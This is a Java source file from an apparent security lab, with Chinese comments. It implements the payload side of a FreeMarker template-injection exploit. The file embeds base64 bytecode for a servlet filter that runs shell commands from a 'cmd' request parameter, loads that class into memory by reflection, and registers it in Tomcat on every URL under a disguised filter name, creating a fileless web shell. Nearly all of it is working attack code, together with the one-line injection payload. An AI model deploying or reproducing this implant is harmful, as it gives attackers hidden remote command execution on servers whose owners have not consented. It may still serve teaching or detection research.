package com.lab.themepreview.memshell;

import freemarker.template.ObjectConstructor;
import freemarker.template.SimpleScalar;
import freemarker.template.TemplateModel;
import freemarker.template.TemplateModelException;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;

/**
 * ============================================================================
 *  ★ 这是「payload 侧」的类，不是业务代码。
 * ============================================================================
 *
 * 它存在的唯一目的：让 FreeMarker 的那一行 payload 尽量短、自包含、可复现：
 *
 *   ${"com.lab.themepreview.memshell.InjectHelper"?new(servletContext)()}
 *
 * 它做了三件事：
 *   1. 把 {@link #MEMSHELL_CLASS_B64}（内嵌的 MemshellFilter 字节码）用
 *      ClassLoader#defineClass 动态加载成类 —— 这个类不在应用的 jar 里，
 *      只存在于 JVM 内存中（进程重启即消失，这正是「内存马」）。
 *   2. 反射拿到 Spring 应用正在使用的 Tomcat StandardContext：
 *      ServletContext 的实现是 org.apache.catalina.core.ApplicationContextFacade，
 *      它的私有字段 context 就是 ApplicationContext，再取 .context 即 StandardContext。
 *   3. addFilterDef + addFilterMap + filterStart，把 /memshell 注册进运行中的容器。
 *
 * 实现了 FreeMarker 的 ObjectConstructor：?new(ctx) 会调构造器（注入在这里发生），
 * 构造出来的对象紧接着被 () 调用（exec 返回注入结果），于是注入结果直接回显在模板响应里。
 *
 * 它没有被任何 Controller 引用 —— 只能通过 SSTI 到达。
 */
public class InjectHelper implements ObjectConstructor {

    /** MemshellFilter 的字节码（base64），由 ../build-memshell.ps1 生成后填进来。 */
    public static final String MEMSHELL_CLASS_B64 = "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cwwBKQEqAQAQamF2YS9sYW5nL09iamVjdAcBKwwBLAEtDAEuAS8BAANuL2EBAAEmAQAFJmFtcDsMATABMQEAATwBAAQmbHQ7AQABPgEABCZndDsBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BAA1qYXZhL3V0aWwvTWFwAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQACW0IBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEABmxlbmd0aAEAAygpSQEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXREZWNvZGVyAQAHRGVjb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBAAR0cmltAQAYamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyAQAGZGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAGGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldAEAB2Zvck5hbWUBAC4oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAfKFtCTGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDspVgEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBAAVmbHVzaAEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAOChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAtlbnZpcm9ubWVudAEAESgpTGphdmEvdXRpbC9NYXA7AQADcHV0AQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABNyZWRpcmVjdEVycm9yU3RyZWFtAQAdKFopTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEAFGphdmEvaW8vT3V0cHV0U3RyZWFtAQAFY2xvc2UBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAHKFtCSUkpVgEAB3dhaXRGb3IBAAt0b0J5dGVBcnJheQEABCgpW0IBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB3ZhbHVlT2YBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwAhAAIATwABAFsAAgAaAFwAXQABAF4AAAACAA0AGgBfAF0AAQBeAAAAAgADAAgAAQBgAGEAAQBiAAAAHQABAAEAAAAFKrcAAbEAAAABAGMAAAAGAAEAAAAnAAEAZABlAAEAYgAAABkAAAACAAAAAbEAAAABAGMAAAAGAAEAAAAuAAEAZgBnAAIAYgAAAYQABAAHAAAA3wE6BCsSA7kABAIAOgUZBcYAJxkFtgAFngAfuwAGWbgABxkFtgAItgAJEgq4AAu3AAw6BKcADSsSDbkABAIAOgSnAAU6BRkExgALGQS2AAWaAAwtKyy5AA8DALEqGQS3ABA6BacAGzoGuwARWbcAEhITtgAUGQa2ABW2ABY6BSwSF7kAGAIAuwARWbcAEjoGGQYSGbYAFBIatgAUEhu2ABQZBLgAHLYAFBIdtgAUGQW4ABy2ABQSHrYAFCq3AB+2ABQSILYAFFcsuQAhAQAZBrYAFrYAIiy5ACEBALYAI7EAAgADAEAAQwAOAFsAYwBmAA4AAgBjAAAAXgAXAAAAMwADADUADQA2ABoANwA2ADkAQAA8AEMAOwBFAD8AUgBAAFoAQQBbAEYAYwBJAGYARwBoAEgAfgBLAIYATACPAE0AmABOAJ0ATwCvAFAAxwBRANUAUgDeAFMAaAAAAB8ACP0ANgcAaQcAafoACUIHAGoBDAhKBwBq/AAXBwBpAGsAAAAGAAIAbABtAAEAbgBhAAEAYgAAABkAAAABAAAAAbEAAAABAGMAAAAGAAEAAABXAAIAbwBwAAIAYgAAAVAABgAJAAAAxhIkEiW4ACa2ACcSKLYAKZkAILsAKlkGvQAGWQMSK1NZBBIsU1kFK1O3AC1NpwAduwAqWQa9AAZZAxIuU1kEEi9TWQUrU7cALU0stgAwTi0SMRIyuQAzAwBXLRI0EjW5ADMDAFcsBLYANlcstgA3OgQZBLYAOLYAObsAOlm3ADs6BRkEtgA8OgYREAC8CDoHGQYZB7YAPVk2CJ4AEBkFGQcDFQi2AD6n/+kZBrYAPxkEtgBAV7sABlkZBbYAQRIKuAALtwAMsAAAAAIAYwAAAEYAEQAAAF4AEgBfAC8AYQBJAGMATgBkAFkAZQBkAGYAagBoAHAAaQB4AGoAgQBrAIgAbACPAG4AnABvAKkAcQCuAHIAtABzAGgAAAAsAAQv/AAZBwBx/wBFAAgHAHIHAGkHAHEHAHMHAHQHAHUHAHYHAHcAAPwAGQEAawAAAAQAAQB4AAIAeQB6AAEAYgAAAFcAAgABAAAAM7sAEVm3ABISQrYAFBJDuABEtgAUEkW2ABQqtgBGtgBHtgAVEki2ABQqtwBJtgAUtgAWsAAAAAEAYwAAABIABAAAAHcAGgB4ACkAeQAyAHcAAgB7AHoAAQBiAAAAfAADAAQAAAA4Ekq4AEsSTAO9AE22AE5MKwEDvQBPtgBQTSy2AEYSUQO9AE22AE4sA70AT7YAUE4tuABSsEwSU7AAAQAAADMANAAOAAIAYwAAAB4ABwAAAH4ACwB/AA8AgAAZAIEALwCCADQAgwA1AIQAaAAAAAYAAXQHAGoACgB8AHAAAQBiAAAARwADAAEAAAAeKscABhIlsCoSVBJVtgBWElcSWLYAVhJZElq2AFawAAAAAgBjAAAADgADAAAAiQAEAIoABwCMAGgAAAADAAEHAAIAfQAAAAIAfgDxAAAACgABAIkAhgDwAAk=";

    public static final String MEMSHELL_CLASS_NAME = "com.lab.themepreview.memshell.plugin.MemshellFilter";
    public static final String URL_PATTERN = "/*";
    public static final String FILTER_NAME = "themeHubSessionFilter";

    private final String status;

    /** FreeMarker 的 ?new(servletContext) 走这里。 */
    public InjectHelper(Object servletContext) {
        String s;
        try {
            s = install(servletContext);
        } catch (Throwable t) {
            s = "FAIL " + t;
        }
        this.status = s;
    }

    /** payload 结尾的 () 走这里：把注入结果回显到模板响应。 */
    @Override
    public TemplateModel exec(List arguments) throws TemplateModelException {
        return new SimpleScalar(status);
    }

    // ========================================================================
    // 注入实现
    // ========================================================================
    public static String install(Object servletContext) throws Exception {
        Object standardContext = contextFrom(servletContext);
        if (standardContext == null) {
            return "FAIL cannot-resolve-StandardContext from " + servletContext;
        }

        byte[] bytes = java.util.Base64.getDecoder().decode(MEMSHELL_CLASS_B64.replaceAll("\\s", ""));
        Class<?> memshell = defineClass(bytes, MEMSHELL_CLASS_NAME);

        Object filter = memshell.getDeclaredConstructor().newInstance();
        invoke(filter, "init", new Class<?>[]{javax.servlet.FilterConfig.class}, new Object[]{null});

        // --- FilterDef ---
        Class<?> filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
        Object filterDef = filterDefClass.getDeclaredConstructor().newInstance();
        callSetter(filterDef, "setFilterName", FILTER_NAME);
        callSetter(filterDef, "setFilter", filter);
        callSetter(filterDef, "setFilterClass", MEMSHELL_CLASS_NAME);
        callSetterIfPresent(filterDef, "setAsyncSupported", boolean.class, Boolean.TRUE);
        invoke(standardContext, "addFilterDef", new Class<?>[]{filterDefClass}, new Object[]{filterDef});

        // --- FilterMap: 映射到 /* ---
        Class<?> filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
        Object filterMap = filterMapClass.getDeclaredConstructor().newInstance();
        callSetter(filterMap, "setFilterName", FILTER_NAME);
        if (!callSetterIfPresent(filterMap, "addURLPattern", String.class, URL_PATTERN)) {
            callSetterIfPresent(filterMap, "setURLPattern", String.class, URL_PATTERN);
        }
        boolean mapped = invoke(standardContext, "addFilterMap",
                new Class<?>[]{filterMapClass}, new Object[]{filterMap});
        if (!mapped) {
            Method m = standardContext.getClass().getMethod("addFilterMap", filterMapClass);
            m.setAccessible(true);
            Object r = m.invoke(standardContext, filterMap);
            mapped = !(r instanceof Boolean) || Boolean.TRUE.equals(r);
        }

        // --- 重建 filter chain：Tomcat 下次请求就会用上新 filter ---
        boolean started = false;
        try {
            started = invoke(standardContext, "filterStart", new Class<?>[0], new Object[0]);
        } catch (Throwable t) {
            System.err.println("[memshell] filterStart failed: " + t);
        }

        return "OK GET /memshell?cmd=id | filterMapped=" + mapped + " | filterStart=" + started
                + " | ctx=" + standardContext.getClass().getName()
                + " | filterLoader=" + memshell.getClassLoader();
    }

    /** ServletContext(ApplicationContextFacade) -> ApplicationContext -> StandardContext */
    private static Object contextFrom(Object servletContext) {
        if (servletContext == null) {
            return null;
        }
        if (servletContext.getClass().getName().equals("org.apache.catalina.core.StandardContext")) {
            return servletContext;
        }
        Object o = servletContext;
        for (int i = 0; i < 4; i++) {
            Object next = readField(o, "context");
            if (next == null || next == o) {
                break;
            }
            o = next;
            if (o.getClass().getName().equals("org.apache.catalina.core.StandardContext")) {
                return o;
            }
        }
        return null;
    }

    private static Object readField(Object target, String name) {
        Class<?> c = target.getClass();
        while (c != null) {
            try {
                Field f = c.getDeclaredField(name);
                f.setAccessible(true);
                return f.get(target);
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            } catch (Throwable t) {
                return null;
            }
        }
        return null;
    }

    // ------------------------------------------------------------------------
    // 动态定义类：优先应用 ClassLoader，其次 Tomcat WebappClassLoader，最后自建
    // ------------------------------------------------------------------------
    private static Class<?> defineClass(byte[] bytes, String name) throws Exception {
        ClassLoader appLoader = InjectHelper.class.getClassLoader();
        ClassLoader webappLoader = webappClassLoader();
        ClassLoader tccl = Thread.currentThread().getContextClassLoader();

        ClassLoader[] chain = new ClassLoader[]{appLoader, webappLoader, tccl};
        StringBuilder tried = new StringBuilder();
        for (ClassLoader cl : chain) {
            if (cl == null) {
                continue;
            }
            String cn = cl.getClass().getName();
            if (tried.indexOf(cn) >= 0) {
                continue;
            }
            tried.append(cn).append(' ');
            Class<?> c = tryDefine(cl, bytes, name);
            if (c != null) {
                return c;
            }
        }
        ClassLoader cl = new java.net.URLClassLoader(new java.net.URL[0], appLoader);
        Class<?> c = tryDefine(cl, bytes, name);
        if (c != null) {
            return c;
        }
        throw new ClassNotFoundException("cannot define " + name + " via [" + tried.toString().trim() + "]");
    }

    /** 从 TCCL 往上找 Tomcat 的 WebappClassLoaderBase（它才知道自己的 StandardContext）。 */
    private static ClassLoader webappClassLoader() {
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        while (cl != null) {
            String n = cl.getClass().getName();
            if (n.equals("org.apache.catalina.loader.WebappClassLoaderBase")
                    || n.equals("org.apache.catalina.loader.WebappClassLoader")
                    || n.equals("org.apache.catalina.loader.ParallelWebappClassLoader")) {
                return cl;
            }
            cl = cl.getParent();
        }
        return null;
    }

    private static Class<?> tryDefine(ClassLoader cl, byte[] bytes, String name) {
        // 1) 反射调用 protected ClassLoader#defineClass
        try {
            Method m = ClassLoader.class.getDeclaredMethod("defineClass",
                    String.class, byte[].class, int.class, int.class);
            m.setAccessible(true);
            Object r = m.invoke(cl, name, bytes, 0, bytes.length);
            if (r instanceof Class) {
                return (Class<?>) r;
            }
        } catch (Throwable ignored) {
        }
        // 2) 匿名子类里调 defineClass（FlushableClassLoader 经典写法）
        try {
            return new FlushableClassLoader(cl, bytes).loadClass(name);
        } catch (Throwable ignored) {
        }
        return null;
    }

    /** 父加载器委派 + 拦截目标包名，经典内存马 defineClass 姿势。 */
    public static class FlushableClassLoader extends ClassLoader {
        private final byte[] bytes;

        public FlushableClassLoader(ClassLoader parent, byte[] bytes) {
            super(parent);
            this.bytes = bytes;
        }

        @Override
        public Class<?> loadClass(String name) throws ClassNotFoundException {
            return loadClass(name, false);
        }

        @Override
        protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {
            if (name.startsWith("com.lab.themepreview.memshell.plugin.")) {
                Class<?> c = findLoadedClass(name);
                if (c == null) {
                    c = defineClass(name, bytes, 0, bytes.length);
                }
                if (resolve) {
                    resolveClass(c);
                }
                return c;
            }
            return super.loadClass(name, resolve);
        }
    }

    // ------------------------------------------------------------------------
    // 反射小工具
    // ------------------------------------------------------------------------
    private static boolean invoke(Object target, String method, Class<?>[] types, Object[] args) {
        try {
            Method m = target.getClass().getMethod(method, types);
            m.setAccessible(true);
            Object r = m.invoke(target, args);
            return !(r instanceof Boolean) || Boolean.TRUE.equals(r);
        } catch (Throwable t) {
            System.err.println("[memshell] invoke " + method + " failed: " + t);
            return false;
        }
    }

    private static void callSetter(Object target, String setter, Object value) throws Exception {
        Method m = target.getClass().getMethod(setter, value.getClass());
        m.setAccessible(true);
        m.invoke(target, value);
    }

    private static boolean callSetterIfPresent(Object target, String setter, Class<?> type, Object value) {
        try {
            Method m = target.getClass().getMethod(setter, type);
            m.setAccessible(true);
            m.invoke(target, value);
            return true;
        } catch (Throwable t) {
            return false;
        }
    }
}
